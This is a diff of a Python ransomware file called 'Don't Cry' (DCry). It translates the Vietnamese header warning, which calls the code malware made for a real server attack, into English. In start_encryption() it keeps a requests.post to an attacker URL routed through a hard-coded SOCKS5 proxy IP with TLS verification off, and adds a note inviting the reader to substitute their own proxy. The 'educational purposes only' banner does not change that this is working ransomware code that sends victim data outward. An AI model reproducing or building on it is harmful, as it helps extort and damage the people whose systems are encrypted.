@@ -2,9 +2,9 @@
 #                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
-# Lưu ý: đây là mã độc DCry, được phát triển để thực hiện một cuộc tấn công thực thụ vào một hệ thống máy chủ.
-# Vì vậy, mã độc này có thể gây ra thiệt hại nghiêm trọng cho hệ thống và dữ liệu của bạn.
-# Nên hãy sử dụng mã này một cách cẩn thận và chỉ được sử dụng trong các cuộc tấn công mạng giả lập nâng cao dưới sự giám sát của ít nhất một chuyên gia về an ninh mạng.
+# Warning: This is DCry malware, developed to perform an actual attack on a server system.
+# Therefore, this malware can cause serious damage to your system and data.
+# Use this code with caution and only in advanced simulated cyberattack scenarios under the supervision of at least one cybersecurity expert.
 
 import os
 import sys
@@ -331,7 +331,7 @@ def start_encryption():
     proxies = {
         'http': 'socks5h://199.116.112.6:4145',
         'https': 'socks5h://199.116.112.6:4145'
-    }
+    } # replace with your proxy if you have one
 
     try:
         requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=10)
